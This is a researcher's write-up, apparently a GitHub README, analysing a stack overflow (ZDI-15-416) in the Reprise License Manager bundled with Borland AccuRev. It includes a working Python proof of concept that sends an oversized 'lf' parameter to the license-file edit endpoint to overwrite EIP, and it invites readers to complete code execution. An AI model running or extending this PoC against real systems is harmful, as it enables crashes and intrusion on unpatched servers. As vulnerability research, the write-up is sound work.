# Borland-AccuRev/rlm StackoverFlow (another "0day")
****

simospar@gmail.com / https://twitter.com/symeonp 

Here is my story regarding this stack-based overflow:
I got an email from a company where they wanted to see how you work:

````
1) ZDI released a '0day' advisory for the following issue:
http://www.zerodayinitiative.com/advisories/ZDI-15-416/.

1A) Provide your own analysis of this issue.

1B) Can you reverse engineer from this description to a workable POC?

1C) Exploit?
````

While I neither wanted to send an email nor spoil it,luckily @R00tkitSMM did it for me here https://github.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/blob/master/README.md
(I guess he was not aware of that!) so here are some stuff that I found:


Following zdi's link we get:

````
this vulnerability allows remote attackers to execute arbitrary code on 
vulnerable installations of Borland AccuRev. Authentication is not required
to exploit this vulnerability.

The specific flaw exists within the service_startup_doit functionality
of the Reprise License Manager service. The issue lies in the handling 
of the licfile parameter which can result in overflowing a stack-based buffer.
An attacker could leverage this vulnerability to execute code under the context of SYSTEM.
````

To clear the frustration it turns out that this issue is not affecting the Borland-Accurev itself but rather the RLM (Reprise License Manager)
which actually ships with Borland (I don't know why the zdi contacted Borland but that's not my problem anyways!)

Following that on IDA I found the 'vulnerable' function, set up some breakpoints and meh nothing happened - it wouldn't trigger anything at all.

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/service_setup_doit.png) 

After that I spent some  time and started playing around with this software, here's what I found:

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/edit_license_file.png) 

That's an interesting attack vector, what happens if we enter a biiiiig file like that:

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/burp_lf_parameter.png) 

You guessed right, we smashed the stack!

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/stack_smash1.png) 


My next step was to find the offsets, Im not gonna show you since it's literally everywhere so here's the POC
where you control EIP:

<poc>

```python
import socket
import struct

target = "192.168.2.175" # Windows xp sp3
port = 5054


junk = 994
payload = "A" * junk
payload += struct.pack("<L", 0x41424344) # eip overwrite
payload += "\xcc" * (2000 - len(payload))

buffer = (
"GET http://" + target+":"+ str(port) + "/goform/edit_lf_get_data?lf="+payload+"&ok=Edit+License+File HTTP/1.1\r\n"
"Host: " + target+":"+ str(port) + "\r\n"
"User-Agent: Mozilla/5.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + target+":"+ str(port) + "/goforms/service_setup\r\n"
"Cookie: user=admin:3ff\r\n"
"Connection: keep-alive\r\n\r\n"
    )


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(buffer)
s.close()
```

....and from Immunity Debugger:

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/eip_control.png) 


Whoa! That's great but hold on.
Looking at stack we see that we are only 0x4c bytes away from our junk, if we could find a way to pivot
back to those bytes that would be a win.

We are facing some issues though:

1. Null-bytes
2. SafeSEH
3. ASLR (on a modern system that Im not using right now!)

Forget a bit about ASLR cause we have a bigger problem: Any byte that contains a null character it is going
to break our exploit and as such partial EIP overwrite is not possible.

![alt tag](https://raw.githubusercontent.com/symeonp/exploits/master/AccuRev/modules.png) 


Looking at the modules above using IDA Sploiter we see that pretty much all of the loaded modules use SafeSEH, so any addresses
taken from those modules for our stack pivot windows will kill it.

So yeah that's it - a bit fail hah but at least I had fun.

If you have some time please go ahead and double check it - you might find something that I missed.
Please hit me up on twitter if you come up with something that pops a calc :)

Cheers,
Symeon

Thanks and shoutz to Xeno and Corey, corelan team, Cody (for meeting me and giving me some tremendous input!), and the guys from
radamsa for putting up with me! (Richard,Atte,Aki,over,bef0rd,Piru)

p.s. The PoC has been tested on version 10.1BL2 - AccuRev's version, I couldn't trigger that on @R00tkitSMM link (11.3BL1) -
I guess they patched it but Im not gonna spend more time on that.



